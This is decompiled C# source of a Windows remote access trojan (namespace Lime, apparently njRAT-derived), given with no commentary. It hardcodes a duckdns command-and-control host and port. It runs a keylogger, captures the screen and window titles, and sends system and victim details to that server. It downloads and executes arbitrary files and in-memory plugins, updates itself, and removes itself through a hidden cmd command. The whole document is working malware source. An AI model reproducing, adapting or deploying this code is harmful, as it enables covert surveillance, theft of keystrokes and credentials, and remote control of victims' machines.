﻿// Decompiled with JetBrains decompiler
// Type: Lime.Program
// Assembly: WX1, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 1022E916-AA3E-479D-AE5C-A72A19B55994
// Assembly location: D:\download (3).exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Lime
{
  public class Program
  {
    public static string host = "wins10.duckdns.org";
    public static string port = "57831";
    public static string registryName = "33f0e228b5d";
    public static string splitter = "@!#&^%$";
    public static string victimName = "TllBTiBDQVQ=";
    public static string version = "0.7NC";
    public static Mutex stubMutex = (Mutex) null;
    public static FileInfo currentAssemblyFileInfo = new FileInfo(Application.ExecutablePath);
    public static Keylogger keylogger = (Keylogger) null;
    public static bool isConnected = false;
    public static TcpClient tcpSocket = (TcpClient) null;
    private static MemoryStream memoryStream = new MemoryStream();
    private static byte[] bytesArray = new byte[5121];
    private static string lastCapturedImage = "";
    public static object currentPlugin = (object) null;

    [STAThread]
    public static void Main() => Program.Start();

    public static void Start()
    {
      if (Interaction.Command() != null)
      {
        try
        {
          Registry.CurrentUser.SetValue("di", (object) "!");
        }
        catch
        {
        }
        Thread.Sleep(5000);
      }
      bool createdNew = false;
      Program.stubMutex = new Mutex(true, Program.registryName, out createdNew);
      if (!createdNew)
        Environment.Exit(0);
      new Thread(new ThreadStart(Program.Receive), 1).Start();
      try
      {
        Program.keylogger = new Keylogger();
        new Thread(new ThreadStart(Program.keylogger.WRK), 1).Start();
      }
      catch
      {
      }
      int num = 0;
      string Left = "";
      while (true)
      {
        Thread.Sleep(1000);
        if (!Program.isConnected)
          Left = "";
        Application.DoEvents();
        try
        {
          checked { ++num; }
          if (num == 5)
          {
            try
            {
              Process.GetCurrentProcess().MinWorkingSet = (IntPtr) 1024;
            }
            catch
            {
            }
          }
          if (num >= 8)
          {
            num = 0;
            string foregroundWindowTitle = Program.GetForegroundWindowTitle();
            if (Operators.CompareString(Left, foregroundWindowTitle, false) != 0)
            {
              Left = foregroundWindowTitle;
              Program.Send("act" + Program.splitter + foregroundWindowTitle);
            }
          }
        }
        catch
        {
        }
      }
    }

    public static void DeleteValueFromRegistry(string name)
    {
      try
      {
        using (RegistryKey subKey = Registry.CurrentUser.CreateSubKey("Software\\" + Program.registryName, RegistryKeyPermissionCheck.ReadWriteSubTree))
          subKey.DeleteValue(name);
      }
      catch
      {
      }
    }

    public static object GetValueFromRegistry(string name, object ret)
    {
      try
      {
        using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\" + Program.registryName, RegistryKeyPermissionCheck.ReadWriteSubTree))
          return registryKey.GetValue(name, RuntimeHelpers.GetObjectValue(ret));
      }
      catch
      {
        return ret;
      }
    }

    public static bool SaveValueOnRegistry(string n, object t, RegistryValueKind typ)
    {
      try
      {
        using (RegistryKey subKey = Registry.CurrentUser.CreateSubKey("Software\\" + Program.registryName, RegistryKeyPermissionCheck.ReadWriteSubTree))
        {
          subKey.SetValue(n, RuntimeHelpers.GetObjectValue(t));
          return true;
        }
      }
      catch
      {
        return false;
      }
    }

    public static string GetInfo()
    {
      string str1 = "ll" + Program.splitter;
      string str2;
      try
      {
        if (Operators.ConditionalCompareObjectEqual(Program.GetValueFromRegistry("vn", (object) ""), (object) "", false))
        {
          string str3 = str1;
          string s = Program.Base64ToString(ref Program.victimName) + "_" + Program.GetHWID();
          str2 = str3 + Program.StringToBase64(ref s) + Program.splitter;
        }
        else
        {
          string str4 = str1;
          string s1 = Conversions.ToString(Program.GetValueFromRegistry("vn", (object) ""));
          string s2 = Program.Base64ToString(ref s1) + "_" + Program.GetHWID();
          str2 = str4 + Program.StringToBase64(ref s2) + Program.splitter;
        }
      }
      catch
      {
        string str5 = str1;
        string hwid = Program.GetHWID();
        str2 = str5 + Program.StringToBase64(ref hwid) + Program.splitter;
      }
      string str6;
      try
      {
        str6 = str2 + Environment.MachineName + Program.splitter;
      }
      catch
      {
        str6 = str2 + "N/A" + Program.splitter;
      }
      string str7;
      try
      {
        str7 = str6 + Environment.UserName + Program.splitter;
      }
      catch
      {
        str7 = str6 + "N/A" + Program.splitter;
      }
      string str8;
      try
      {
        str8 = str7 + Program.currentAssemblyFileInfo.LastWriteTime.Date.ToString("yy-MM-dd") + Program.splitter;
      }
      catch
      {
        str8 = str7 + "N/A" + Program.splitter;
      }
      string str9 = str8 + "" + Program.splitter;
      string str10;
      try
      {
        str10 = str9 + new Computer().Info.OSFullName;
      }
      catch
      {
        str10 = str9 + "N/A";
      }
      string str11 = str10 + "SP";
      string str12;
      try
      {
        string[] strArray = Strings.Split(Environment.OSVersion.ServicePack);
        if (strArray.Length == 1)
          str11 += "0";
        str12 = str11 + strArray[checked (strArray.Length - 1)];
      }
      catch
      {
        str12 = str11 + "0";
      }
      string str13;
      try
      {
        str13 = !Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles).Contains("x86") ? str12 + " x86" + Program.splitter : str12 + " x64" + Program.splitter;
      }
      catch
      {
        str13 = str12 + Program.splitter;
      }
      string str14 = (!Program.SearchForCam() ? str13 + "No" + Program.splitter : str13 + "Yes" + Program.splitter) + Program.version + Program.splitter + ".." + Program.splitter + Program.GetForegroundWindowTitle() + Program.splitter;
      string str15 = "";
      try
      {
        string[] valueNames = Registry.CurrentUser.CreateSubKey("Software\\" + Program.registryName, RegistryKeyPermissionCheck.Default).GetValueNames();
        int index = 0;
        while (index < valueNames.Length)
        {
          string str16 = valueNames[index];
          if (str16.Length == 32)
            str15 = str15 + str16 + ",";
          checked { ++index; }
        }
      }
      catch
      {
      }
      return str14 + str15;
    }

    public static string StringToBase64(ref string s) => Convert.ToBase64String(Program.StringToBytes(ref s));

    public static string Base64ToString(ref string s)
    {
      byte[] B = Convert.FromBase64String(s);
      return Program.BytesToString(ref B);
    }

    public static byte[] StringToBytes(ref string S) => Encoding.UTF8.GetBytes(S);

    public static string BytesToString(ref byte[] B) => Encoding.UTF8.GetString(B);

    public static byte[] DecompressGzip(byte[] B)
    {
      MemoryStream memoryStream = new MemoryStream(B);
      GZipStream gzipStream = new GZipStream((Stream) memoryStream, CompressionMode.Decompress);
      byte[] buffer1 = new byte[4];
      memoryStream.Position = checked (memoryStream.Length - 5L);
      memoryStream.Read(buffer1, 0, 4);
      int int32 = BitConverter.ToInt32(buffer1, 0);
      memoryStream.Position = 0L;
      byte[] buffer2 = new byte[checked (int32 - 1 + 1)];
      gzipStream.Read(buffer2, 0, int32);
      gzipStream.Dispose();
      memoryStream.Dispose();
      return buffer2;
    }

    public static bool SearchForCam()
    {
      try
      {
        int num = 0;
        do
        {
          short wDriver = checked ((short) num);
          string lpszName = Strings.Space(100);
          int cbName = 100;
          string lpszVer = (string) null;
          if (!Program.capGetDriverDescriptionA(wDriver, ref lpszName, cbName, ref lpszVer, 100))
            checked { ++num; }
          else
            goto label_3;
        }
        while (num <= 4);
        goto label_5;
label_3:
        return true;
      }
      catch
      {
      }
label_5:
      return false;
    }

    public static string GetForegroundWindowTitle()
    {
      string foregroundWindowTitle;
      try
      {
        IntPtr foregroundWindow = Program.GetForegroundWindow();
        if (foregroundWindow == IntPtr.Zero)
        {
          foregroundWindowTitle = "";
        }
        else
        {
          string str = Strings.Space(checked (Program.GetWindowTextLength((long) foregroundWindow) + 1));
          Program.GetWindowText(foregroundWindow, ref str, str.Length);
          foregroundWindowTitle = Program.StringToBase64(ref str);
        }
      }
      catch
      {
        foregroundWindowTitle = "";
      }
      return foregroundWindowTitle;
    }

    public static string GetHWID()
    {
      try
      {
        string lpRootPathName = Interaction.Environ("SystemDrive") + "\\";
        string lpVolumeNameBuffer = (string) null;
        int nVolumeNameSize = 0;
        int lpMaximumComponentLength = 0;
        int lpFileSystemFlags = 0;
        string lpFileSystemNameBuffer = (string) null;
        int lpVolumeSerialNumber = 0;
        Program.GetVolumeInformation(ref lpRootPathName, ref lpVolumeNameBuffer, nVolumeNameSize, ref lpVolumeSerialNumber, ref lpMaximumComponentLength, ref lpFileSystemFlags, ref lpFileSystemNameBuffer, 0);
        return Conversion.Hex(lpVolumeSerialNumber);
      }
      catch
      {
        return "ERR";
      }
    }

    public static object Plugin(byte[] b, string c)
    {
      Module[] modules = Assembly.Load(b).GetModules();
      int index1 = 0;
      while (index1 < modules.Length)
      {
        Module module = modules[index1];
        System.Type[] types = module.GetTypes();
        int index2 = 0;
        while (index2 < types.Length)
        {
          System.Type type = types[index2];
          if (type.FullName.EndsWith("." + c))
            return module.Assembly.CreateInstance(type.FullName);
          checked { ++index2; }
        }
        checked { ++index1; }
      }
      return (object) null;
    }

    public static void Uninstall()
    {
      try
      {
        Registry.CurrentUser.OpenSubKey("Software", true).DeleteSubKeyTree(Program.registryName);
      }
      catch
      {
      }
      try
      {
        Interaction.Shell("cmd.exe /C Y /N /D Y /T 1 & Del \"" + Program.currentAssemblyFileInfo.FullName + "\"", AppWinStyle.Hide);
      }
      catch
      {
      }
      try
      {
        Program.stubMutex.Close();
      }
      catch
      {
      }
      Environment.Exit(0);
    }

    public static void HandleData(byte[] b)
    {
      string[] strArray1 = Strings.Split(Program.BytesToString(ref b), Program.splitter);
      try
      {
        string Left1 = strArray1[0];
        if (Operators.CompareString(Left1, "ll", false) == 0)
          Program.isConnected = false;
        else if (Operators.CompareString(Left1, "kl", false) == 0)
          Program.Send("kl" + Program.splitter + Program.StringToBase64(ref Program.keylogger.Logs));
        else if (Operators.CompareString(Left1, "prof", false) == 0)
        {
          string Left2 = strArray1[1];
          if (Operators.CompareString(Left2, "~", false) == 0)
            Program.SaveValueOnRegistry(strArray1[2], (object) strArray1[3], RegistryValueKind.String);
          else if (Operators.CompareString(Left2, "!", false) == 0)
          {
            Program.SaveValueOnRegistry(strArray1[2], (object) strArray1[3], RegistryValueKind.String);
            Program.Send(Conversions.ToString(Operators.ConcatenateObject((object) ("getvalue" + Program.splitter + strArray1[1] + Program.splitter), Program.GetValueFromRegistry(strArray1[1], (object) ""))));
          }
          else
          {
            if (Operators.CompareString(Left2, "@", false) != 0)
              return;
            Program.DeleteValueFromRegistry(strArray1[2]);
          }
        }
        else if (Operators.CompareString(Left1, "rn", false) == 0)
        {
          byte[] bytes;
          if (strArray1[2][0] == '\u001F')
          {
            try
            {
              MemoryStream memoryStream = new MemoryStream();
              int length = (strArray1[0] + Program.splitter + strArray1[1] + Program.splitter).Length;
              memoryStream.Write(b, length, checked (b.Length - length));
              bytes = Program.DecompressGzip(memoryStream.ToArray());
            }
            catch
            {
              Program.Send("MSG" + Program.splitter + "Execute ERROR");
              Program.Send("bla");
              return;
            }
          }
          else
          {
            WebClient webClient = new WebClient();
            try
            {
              bytes = webClient.DownloadData(strArray1[2]);
            }
            catch
            {
              Program.Send("MSG" + Program.splitter + "Download ERROR");
              Program.Send("bla");
              return;
            }
          }
          Program.Send("bla");
          string str = Path.GetTempFileName() + "." + strArray1[1];
          try
          {
            System.IO.File.WriteAllBytes(str, bytes);
            Process.Start(str);
            Program.Send("MSG" + Program.splitter + "Executed As " + new FileInfo(str).Name);
          }
          catch (Exception ex)
          {
            Program.Send("MSG" + Program.splitter + "Execute ERROR " + ex.Message);
            ProjectData.ClearProjectError();
          }
        }
        else if (Operators.CompareString(Left1, "inv", false) == 0)
        {
          byte[] numArray = (byte[]) Program.GetValueFromRegistry(strArray1[1], (object) new byte[0]);
          if (strArray1[3].Length < 10 & numArray.Length == 0)
          {
            Program.Send("pl" + Program.splitter + strArray1[1] + Program.splitter + Conversions.ToString(1));
          }
          else
          {
            if (strArray1[3].Length > 10)
            {
              MemoryStream memoryStream = new MemoryStream();
              int length = (strArray1[0] + Program.splitter + strArray1[1] + Program.splitter + strArray1[2] + Program.splitter).Length;
              memoryStream.Write(b, length, checked (b.Length - length));
              numArray = Program.DecompressGzip(memoryStream.ToArray());
              Program.SaveValueOnRegistry(strArray1[1], (object) numArray, RegistryValueKind.Binary);
            }
            Program.Send("pl" + Program.splitter + strArray1[1] + Program.splitter + Conversions.ToString(0));
            object objectValue = RuntimeHelpers.GetObjectValue(Program.Plugin(numArray, "A"));
            NewLateBinding.LateSet(objectValue, (System.Type) null, "h", new object[1]
            {
              (object) Program.host
            }, (string[]) null, (System.Type[]) null);
            NewLateBinding.LateSet(objectValue, (System.Type) null, "p", new object[1]
            {
              (object) Program.port
            }, (string[]) null, (System.Type[]) null);
            NewLateBinding.LateSet(objectValue, (System.Type) null, "osk", new object[1]
            {
              (object) strArray1[2]
            }, (string[]) null, (System.Type[]) null);
            NewLateBinding.LateCall(objectValue, (System.Type) null, "start", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
            while (!Conversions.ToBoolean(Operators.OrObject((object) !Program.isConnected, Operators.CompareObjectEqual(NewLateBinding.LateGet(objectValue, (System.Type) null, "Off", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (object) true, false))))
              Thread.Sleep(1);
            NewLateBinding.LateSet(objectValue, (System.Type) null, "off", new object[1]
            {
              (object) true
            }, (string[]) null, (System.Type[]) null);
          }
        }
        else if (Operators.CompareString(Left1, "ret", false) == 0)
        {
          byte[] numArray = (byte[]) Program.GetValueFromRegistry(strArray1[1], (object) new byte[0]);
          if (strArray1[2].Length < 10 & numArray.Length == 0)
          {
            Program.Send("pl" + Program.splitter + strArray1[1] + Program.splitter + Conversions.ToString(1));
          }
          else
          {
            if (strArray1[2].Length > 10)
            {
              MemoryStream memoryStream = new MemoryStream();
              int length = (strArray1[0] + Program.splitter + strArray1[1] + Program.splitter).Length;
              memoryStream.Write(b, length, checked (b.Length - length));
              numArray = Program.DecompressGzip(memoryStream.ToArray());
              Program.SaveValueOnRegistry(strArray1[1], (object) numArray, RegistryValueKind.Binary);
            }
            Program.Send("pl" + Program.splitter + strArray1[1] + Program.splitter + Conversions.ToString(0));
            object objectValue = RuntimeHelpers.GetObjectValue(Program.Plugin(numArray, "A"));
            string[] strArray2 = new string[5]
            {
              "ret",
              Program.splitter,
              strArray1[1],
              Program.splitter,
              null
            };
            string[] strArray3 = strArray2;
            int index = 4;
            string s = Conversions.ToString(NewLateBinding.LateGet(objectValue, (System.Type) null, "GT", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null));
            strArray3[index] = Program.StringToBase64(ref s);
            Program.Send(string.Concat(strArray2));
          }
        }
        else if (Operators.CompareString(Left1, "CAP", false) == 0)
        {
          int width = Screen.PrimaryScreen.Bounds.Width;
          Rectangle targetRect = Screen.PrimaryScreen.Bounds;
          Bitmap bitmap1 = new Bitmap(width, targetRect.Height, PixelFormat.Format16bppRgb555);
          Graphics graphics1 = Graphics.FromImage((Image) bitmap1);
          graphics1.CopyFromScreen(0, 0, 0, 0, new Size(bitmap1.Width, bitmap1.Height), CopyPixelOperation.SourceCopy);
          try
          {
            Cursor cursor = Cursors.Default;
            Graphics g = graphics1;
            targetRect = new Rectangle(Cursor.Position, new Size(32, 32));
            cursor.Draw(g, targetRect);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          graphics1.Dispose();
          Bitmap bitmap2 = new Bitmap(Conversions.ToInteger(strArray1[1]), Conversions.ToInteger(strArray1[2]));
          Graphics graphics2 = Graphics.FromImage((Image) bitmap2);
          graphics2.DrawImage((Image) bitmap1, 0, 0, bitmap2.Width, bitmap2.Height);
          graphics2.Dispose();
          MemoryStream memoryStream1 = new MemoryStream();
          string S = "CAP" + Program.splitter;
          b = Program.StringToBytes(ref S);
          memoryStream1.Write(b, 0, b.Length);
          MemoryStream memoryStream2 = new MemoryStream();
          bitmap2.Save((Stream) memoryStream2, ImageFormat.Jpeg);
          string hash = Program.CreateHash(memoryStream2.ToArray());
          if (Operators.CompareString(hash, Program.lastCapturedImage, false) != 0)
          {
            Program.lastCapturedImage = hash;
            memoryStream1.Write(memoryStream2.ToArray(), 0, checked ((int) memoryStream2.Length));
          }
          else
            memoryStream1.WriteByte((byte) 0);
          Program.Send(memoryStream1.ToArray());
          memoryStream1.Dispose();
          memoryStream2.Dispose();
          bitmap1.Dispose();
          bitmap2.Dispose();
        }
        else if (Operators.CompareString(Left1, "un", false) == 0)
        {
          string Left3 = strArray1[1];
          if (Operators.CompareString(Left3, "~", false) == 0)
            Program.Uninstall();
          else if (Operators.CompareString(Left3, "!", false) == 0)
          {
            try
            {
              Program.stubMutex.Close();
            }
            catch
            {
            }
            Environment.Exit(0);
          }
          else
          {
            if (Operators.CompareString(Left3, "@", false) != 0)
              return;
            Process.Start(Program.currentAssemblyFileInfo.FullName);
            try
            {
              Program.stubMutex.Close();
            }
            catch
            {
            }
            Environment.Exit(0);
          }
        }
        else if (Operators.CompareString(Left1, "up", false) == 0)
        {
          byte[] bytes;
          if (strArray1[1][0] == '\u001F')
          {
            try
            {
              MemoryStream memoryStream = new MemoryStream();
              int length = (strArray1[0] + Program.splitter).Length;
              memoryStream.Write(b, length, checked (b.Length - length));
              bytes = Program.DecompressGzip(memoryStream.ToArray());
            }
            catch
            {
              Program.Send("MSG" + Program.splitter + "Update ERROR");
              Program.Send("bla");
              return;
            }
          }
          else
          {
            WebClient webClient = new WebClient();
            try
            {
              bytes = webClient.DownloadData(strArray1[1]);
            }
            catch
            {
              Program.Send("MSG" + Program.splitter + "Update ERROR");
              Program.Send("bla");
              return;
            }
          }
          Program.Send("bla");
          string str = Path.GetTempFileName() + ".exe";
          try
          {
            Program.Send("MSG" + Program.splitter + "Updating To " + new FileInfo(str).Name);
            Thread.Sleep(2000);
            System.IO.File.WriteAllBytes(str, bytes);
            Process.Start(str, "..");
          }
          catch (Exception ex)
          {
            Program.Send("MSG" + Program.splitter + "Update ERROR " + ex.Message);
            return;
          }
          Program.Uninstall();
        }
        else if (Operators.CompareString(Left1, "Ex", false) == 0)
        {
          if (Program.currentPlugin == null)
          {
            Program.Send("PLG");
            int num = 0;
            while (!(Program.currentPlugin != null | num == 20 | !Program.isConnected))
            {
              checked { ++num; }
              Thread.Sleep(1000);
            }
            if (Program.currentPlugin == null | !Program.isConnected)
              return;
          }
          object currentPlugin = Program.currentPlugin;
          System.Type Type = (System.Type) null;
          string MemberName = "ind";
          object[] objArray = new object[1]{ (object) b };
          object[] Arguments = objArray;
          string[] ArgumentNames = (string[]) null;
          System.Type[] TypeArguments = (System.Type[]) null;
          bool[] CopyBack = new bool[1]{ true };
          NewLateBinding.LateCall(currentPlugin, Type, MemberName, Arguments, ArgumentNames, TypeArguments, CopyBack, true);
          if (!CopyBack[0])
            return;
          b = (byte[]) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray[0]), typeof (byte[]));
        }
        else
        {
          if (Operators.CompareString(Left1, "PLG", false) != 0)
            return;
          MemoryStream memoryStream = new MemoryStream();
          int length = (strArray1[0] + Program.splitter).Length;
          memoryStream.Write(b, length, checked (b.Length - length));
          Program.currentPlugin = RuntimeHelpers.GetObjectValue(Program.Plugin(Program.DecompressGzip(memoryStream.ToArray()), "A"));
          NewLateBinding.LateSet(Program.currentPlugin, (System.Type) null, "H", new object[1]
          {
            (object) Program.host
          }, (string[]) null, (System.Type[]) null);
          NewLateBinding.LateSet(Program.currentPlugin, (System.Type) null, "P", new object[1]
          {
            (object) Program.port
          }, (string[]) null, (System.Type[]) null);
          NewLateBinding.LateSet(Program.currentPlugin, (System.Type) null, "c", new object[1]
          {
            (object) Program.tcpSocket
          }, (string[]) null, (System.Type[]) null);
        }
      }
      catch (Exception ex)
      {
        if (strArray1.Length > 0)
        {
          if (Operators.CompareString(strArray1[0], "Ex", false) == 0 | Operators.CompareString(strArray1[0], "PLG", false) == 0)
            Program.currentPlugin = (object) null;
        }
        try
        {
          Program.Send("ER" + Program.splitter + strArray1[0] + Program.splitter + ex.Message);
        }
        catch
        {
        }
        ProjectData.ClearProjectError();
      }
    }

    public static string CreateHash(byte[] B)
    {
      B = new MD5CryptoServiceProvider().ComputeHash(B);
      string hash = "";
      byte[] numArray = B;
      int index = 0;
      while (index < numArray.Length)
      {
        byte num = numArray[index];
        hash += num.ToString("x2");
        checked { ++index; }
      }
      return hash;
    }

    public static bool Send(byte[] b)
    {
      if (!Program.isConnected)
        return false;
      try
      {
        lock (Program.currentAssemblyFileInfo)
        {
          if (!Program.isConnected)
            return false;
          MemoryStream memoryStream = new MemoryStream();
          string S = b.Length.ToString() + "\0";
          byte[] bytes = Program.StringToBytes(ref S);
          memoryStream.Write(bytes, 0, bytes.Length);
          memoryStream.Write(b, 0, b.Length);
          Program.tcpSocket.Client.Send(memoryStream.ToArray(), 0, checked ((int) memoryStream.Length), SocketFlags.None);
          memoryStream.Dispose();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        try
        {
          if (Program.isConnected)
          {
            Program.isConnected = false;
            Program.tcpSocket.Close();
          }
        }
        catch
        {
        }
        ProjectData.ClearProjectError();
      }
      return Program.isConnected;
    }

    public static bool Send(string S) => Program.Send(Program.StringToBytes(ref S));

    public static bool Connect()
    {
      Program.isConnected = false;
      Thread.Sleep(2000);
      lock (Program.currentAssemblyFileInfo)
      {
        try
        {
          if (Program.tcpSocket != null)
          {
            try
            {
              Program.tcpSocket.Close();
              Program.tcpSocket = (TcpClient) null;
            }
            catch
            {
            }
          }
          try
          {
            Program.memoryStream.Dispose();
          }
          catch
          {
          }
        }
        catch
        {
        }
        try
        {
          Program.memoryStream = new MemoryStream();
          Program.tcpSocket = new TcpClient();
          Program.tcpSocket.ReceiveBufferSize = 204800;
          Program.tcpSocket.SendBufferSize = 204800;
          Program.tcpSocket.Client.SendTimeout = 10000;
          Program.tcpSocket.Client.ReceiveTimeout = 10000;
          Program.tcpSocket.Connect(Program.host, Conversions.ToInteger(Program.port));
          Program.isConnected = true;
          Program.Send(Program.GetInfo());
          try
          {
            string empty = string.Empty;
            string str1;
            if (Operators.ConditionalCompareObjectEqual(Program.GetValueFromRegistry("vn", (object) ""), (object) "", false))
            {
              str1 = empty + Program.Base64ToString(ref Program.victimName) + "\r\n";
            }
            else
            {
              string str2 = empty;
              string s = Conversions.ToString(Program.GetValueFromRegistry("vn", (object) ""));
              str1 = str2 + Program.Base64ToString(ref s) + "\r\n";
            }
            string s1 = str1 + Program.host + ":" + Program.port + "\r\n" + (object) Program.currentAssemblyFileInfo.Directory + "\r\n" + Program.currentAssemblyFileInfo.Name + "\r\n" + "\r\n" + "\r\n" + "\r\n" + "";
            Program.Send("inf" + Program.splitter + Program.StringToBase64(ref s1));
          }
          catch
          {
          }
        }
        catch
        {
          Program.isConnected = false;
        }
      }
      return Program.isConnected;
    }

    public static void Receive()
    {
      while (true)
      {
        Program.lastCapturedImage = "";
        if (Program.tcpSocket != null)
        {
          long num1 = -1;
          int num2 = 0;
label_2:
          try
          {
            checked { ++num2; }
            if (num2 == 10)
            {
              num2 = 0;
              Thread.Sleep(1);
            }
            if (Program.isConnected)
            {
              if (Program.tcpSocket.Available < 1)
                Program.tcpSocket.Client.Poll(-1, SelectMode.SelectRead);
              while (Program.tcpSocket.Available != 0)
              {
                if (num1 != -1L)
                {
                  Program.bytesArray = new byte[checked (Program.tcpSocket.Available + 1)];
                  long num3 = checked (num1 - Program.memoryStream.Length);
                  if ((long) Program.bytesArray.Length > num3)
                    Program.bytesArray = new byte[checked ((int) (num3 - 1L) + 1)];
                  int count = Program.tcpSocket.Client.Receive(Program.bytesArray, 0, Program.bytesArray.Length, SocketFlags.None);
                  Program.memoryStream.Write(Program.bytesArray, 0, count);
                  if (Program.memoryStream.Length == num1)
                  {
                    num1 = -1L;
                    Thread thread = new Thread((ParameterizedThreadStart) (a0 => Program.HandleData((byte[]) a0)), 1);
                    thread.Start((object) Program.memoryStream.ToArray());
                    thread.Join(100);
                    Program.memoryStream.Dispose();
                    Program.memoryStream = new MemoryStream();
                    goto label_2;
                  }
                  else
                    goto label_2;
                }
                else
                {
                  string str = "";
                  while (true)
                  {
                    int CharCode = Program.tcpSocket.GetStream().ReadByte();
                    switch (CharCode)
                    {
                      case -1:
                        goto label_20;
                      case 0:
                        goto label_15;
                      default:
                        str += Conversions.ToString(Conversions.ToInteger(Strings.ChrW(CharCode).ToString()));
                        continue;
                    }
                  }
label_15:
                  num1 = Conversions.ToLong(str);
                  if (num1 == 0L)
                  {
                    Program.Send("");
                    num1 = -1L;
                  }
                  if (Program.tcpSocket.Available <= 0)
                    goto label_2;
                }
              }
            }
          }
          catch
          {
          }
        }
label_20:
        do
        {
          try
          {
            if (Program.currentPlugin != null)
            {
              NewLateBinding.LateCall(Program.currentPlugin, (System.Type) null, "clear", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
              Program.currentPlugin = (object) null;
            }
          }
          catch
          {
          }
          Program.isConnected = false;
        }
        while (!Program.Connect());
        Program.isConnected = true;
      }
    }

    [DllImport("ntdll")]
    private static extern int NtSetInformationProcess(
      IntPtr hProcess,
      int processInformationClass,
      ref int processInformation,
      int processInformationLength);

    [DllImport("avicap32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern bool capGetDriverDescriptionA(
      short wDriver,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszName,
      int cbName,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszVer,
      int cbVer);

    [DllImport("kernel32", EntryPoint = "GetVolumeInformationA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetVolumeInformation(
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpRootPathName,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpVolumeNameBuffer,
      int nVolumeNameSize,
      ref int lpVolumeSerialNumber,
      ref int lpMaximumComponentLength,
      ref int lpFileSystemFlags,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpFileSystemNameBuffer,
      int nFileSystemNameSize);

    [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr GetForegroundWindow();

    [DllImport("user32.dll", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int GetWindowText(IntPtr hWnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string WinTitle, int MaxLength);

    [DllImport("user32.dll", EntryPoint = "GetWindowTextLengthA", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int GetWindowTextLength(long hwnd);
  }
}
